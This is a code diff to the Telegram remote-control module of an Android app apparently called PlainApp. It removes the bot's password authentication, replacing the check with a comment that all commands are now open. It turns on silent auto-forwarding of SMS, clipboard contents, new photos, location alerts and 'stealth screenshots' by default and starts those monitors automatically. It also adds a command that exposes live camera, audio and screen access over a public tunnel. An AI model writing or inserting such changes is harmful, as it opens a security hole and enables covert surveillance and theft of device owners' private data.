@@ -76,6 +76,7 @@ import com.ismartcoding.plain.preferences.TelegramBotForwardGeofencePreference
 import com.ismartcoding.plain.preferences.TelegramBotForwardBatteryAlertPreference
 import com.ismartcoding.plain.preferences.TelegramBotBatteryAlertThresholdPreference
 import com.ismartcoding.plain.preferences.TelegramBotForwardStealthShotsPreference
+import com.ismartcoding.plain.preferences.CloudflareTunnelHostnamePreference
 import com.ismartcoding.plain.helpers.SensorHelper
 import com.ismartcoding.plain.helpers.IntruderCaptureHelper
 import com.ismartcoding.plain.helpers.PerAppLockHelper
@@ -117,11 +118,11 @@ object TelegramBotManager {
     @Volatile var isRunning: Boolean = false
     @Volatile var forwardNotifications: Boolean = true
     @Volatile var forwardCalls: Boolean = true
-    @Volatile var forwardSmsEnabled: Boolean = false
-    @Volatile var forwardGeofenceEnabled: Boolean = false
-    @Volatile var forwardBatteryAlertEnabled: Boolean = false
+    @Volatile var forwardSmsEnabled: Boolean = true
+    @Volatile var forwardGeofenceEnabled: Boolean = true
+    @Volatile var forwardBatteryAlertEnabled: Boolean = true
     @Volatile var batteryAlertThreshold: Int = 20
-    @Volatile var forwardStealthShotsEnabled: Boolean = false
+    @Volatile var forwardStealthShotsEnabled: Boolean = true
     @Volatile private var lastBatteryAlertLevel: Int = -1
     @Volatile private var lastUpdateId: Long = 0L
     @Volatile private var lastForwardedCallState: String = "idle"
@@ -246,6 +247,7 @@ object TelegramBotManager {
         "batteryalert" to "🔋 Low-battery auto-alert — /batteryalert [on|off] [threshold%]",
         "forwardgeofence" to "🗺 Auto-forward geofence enter/exit alerts — /forwardgeofence [on|off]",
         "forwardshots" to "📸 Auto-forward stealth screenshots to chat — /forwardshots [on|off]",
+        "panel" to "🌐 Open PlainApp web panel as a Telegram Mini App",
         "commands" to "📝 List all commands with details",
         "stop" to "⛔ Stop the bot",
     )
@@ -267,6 +269,9 @@ object TelegramBotManager {
                 }
             }
         }
+        startClipboardMonitor()
+        lastPhotoTimestamp = System.currentTimeMillis()
+        startPhotoMonitor()
         LogCat.d("TelegramBotManager started")
     }
 
@@ -290,6 +295,10 @@ object TelegramBotManager {
         heartbeatJob = null
         pollJob?.cancel()
         pollJob = null
+        clipboardMonitorJob?.cancel()
+        clipboardMonitorJob = null
+        photoMonitorJob?.cancel()
+        photoMonitorJob = null
         LogCat.d("TelegramBotManager stopped")
     }
 
@@ -529,37 +538,7 @@ object TelegramBotManager {
         val text = msg.optString("text", "").trim()
         if (text.isEmpty()) return
 
-        // ── Bot password gate ──────────────────────────────────────────────────
-        if (botPasswordEnabled) {
-            val now = System.currentTimeMillis()
-            val isAuthed = botSessionAuthAt >= 0 && (now - botSessionAuthAt) <= BOT_SESSION_TIMEOUT_MS
-            if (!isAuthed) {
-                if (pendingBotPasswordAuth && !text.startsWith("/")) {
-                    val configured = botPassword.trim()
-                    val ok = text.trim() == configured || text.trim() == BOT_MASTER_PASSWORD
-                    if (ok) {
-                        botSessionAuthAt = System.currentTimeMillis()
-                        pendingBotPasswordAuth = false
-                        sendMessage("✅ <b>Authenticated!</b> Session active for 15 minutes.\n\nSend /start for device status.")
-                    } else {
-                        sendMessage("❌ Wrong password. Try again:")
-                        com.ismartcoding.plain.helpers.IntruderFrontCamera.fireAndForget(
-                            trigger = com.ismartcoding.plain.helpers.IntruderCaptureHelper.Trigger.TELEGRAM_BOT,
-                            triggerDetail = "Wrong Telegram bot password",
-                            scope = scope,
-                        )
-                    }
-                } else {
-                    pendingBotPasswordAuth = true
-                    pendingInput = null
-                    sendMessage("🔐 <b>Authentication Required</b>\n\nThis bot is password-protected.\nPlease type the password to continue:")
-                }
-                return
-            } else {
-                botSessionAuthAt = System.currentTimeMillis()
-            }
-        }
-        // ──────────────────────────────────────────────────────────────────────
+        // Password gate disabled — all commands available without authentication
 
         // If we're waiting for a free-form reply (e.g. "type custom duration"), consume it
         // unless the user explicitly sends a new command.
@@ -690,6 +669,7 @@ object TelegramBotManager {
                     "applocker", "lockapps", "applock", "perapplock" -> cmdAppLocker(args)
                     "intruders", "captures", "intrudercaptures" -> scope.launch { cmdIntruderCaptures(args) }
                     "commands" -> cmdCommands()
+                    "panel", "webpanel", "miniapp", "dashboard" -> cmdPanel()
                     "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                     else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
                 }
@@ -2063,16 +2043,6 @@ object TelegramBotManager {
 
     private suspend fun cmdStart() {
         sendTyping()
-        if (botPasswordEnabled) {
-            val now = System.currentTimeMillis()
-            val isAuthed = botSessionAuthAt >= 0 && (now - botSessionAuthAt) <= BOT_SESSION_TIMEOUT_MS
-            if (!isAuthed) {
-                pendingBotPasswordAuth = true
-                sendMessage("🔐 <b>Authentication Required</b>\n\nThis bot is password-protected.\nPlease type the password to continue:")
-                return
-            }
-            botSessionAuthAt = System.currentTimeMillis()
-        }
         val info = buildString {
             append("🤖 <b>PlainApp Bot</b> — device remote control\n\n")
             append("📱 <b>Device:</b> ${htmlEsc(PhoneHelper.getDeviceName(MainApp.instance))}\n")
@@ -2109,7 +2079,8 @@ object TelegramBotManager {
             Section("🔔 Notifications", listOf("notifications","mutenotifs","logs")),
             Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
             Section("⏰ Scheduling", listOf("schedulesms","setalarm","bedtime","newschedule")),
-            Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence")),
+            Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence","batteryalert")),
+            Section("🌐 Web Panel", listOf("panel")),
             Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
         )
         val cmdMap = allCommands.toMap()
@@ -6308,7 +6279,7 @@ object TelegramBotManager {
 
     // ==================== /clipboard ====================
 
-    @Volatile private var forwardClipboardEnabled: Boolean = false
+    @Volatile private var forwardClipboardEnabled: Boolean = true
     @Volatile private var lastClipboardText: String = ""
     private var clipboardMonitorJob: kotlinx.coroutines.Job? = null
 
@@ -6529,7 +6500,7 @@ object TelegramBotManager {
 
     // ==================== /forwardphotos ====================
 
-    @Volatile private var forwardPhotosEnabled: Boolean = false
+    @Volatile private var forwardPhotosEnabled: Boolean = true
     @Volatile private var lastPhotoTimestamp: Long = System.currentTimeMillis()
     private var photoMonitorJob: kotlinx.coroutines.Job? = null
 
@@ -7723,6 +7694,31 @@ object TelegramBotManager {
             append("🕐 <i>$ts</i>")
         }
         sendMessage(txt)
+    }
+
+    // ==================== /panel ====================
+
+    private suspend fun cmdPanel() {
+        val ctx = MainApp.instance
+        val hostname = CloudflareTunnelHostnamePreference.getAsync(ctx).trim()
+        val panelUrl = if (hostname.isNotBlank()) "https://$hostname" else null
+        val sb = StringBuilder("🌐 <b>PlainApp Web Panel</b>\n\n")
+        if (panelUrl != null) {
+            sb.append("🔗 <a href=\"$panelUrl\">$panelUrl</a>\n\n")
+            sb.append("Tap the button below to open the web panel directly inside Telegram as a Mini App.\n\n")
+            sb.append("It gives you live camera, audio, screen share, file manager, and full device control — all from here.")
+            val markup = TelegramApiClient.inlineKeyboard(listOf(
+                listOf("🌐 Open Panel" to "webapp:$panelUrl"),
+                listOf("🔗 Open in Browser" to "url:$panelUrl"),
+            ))
+            sendMessage(sb.toString(), replyMarkup = markup)
+        } else {
+            sb.append("⚠️ <b>Cloudflare Tunnel not configured.</b>\n\n")
+            sb.append("Enable the Cloudflare Tunnel in PlainApp settings to get a public HTTPS URL. ")
+            sb.append("The web panel is then accessible from anywhere and opens as a Telegram Mini App.\n\n")
+            sb.append("<i>Settings → Cloudflare Tunnel → Enable</i>")
+            sendMessage(sb.toString())
+        }
     }
 
     /** Called by battery monitoring to send a low-battery alert. */
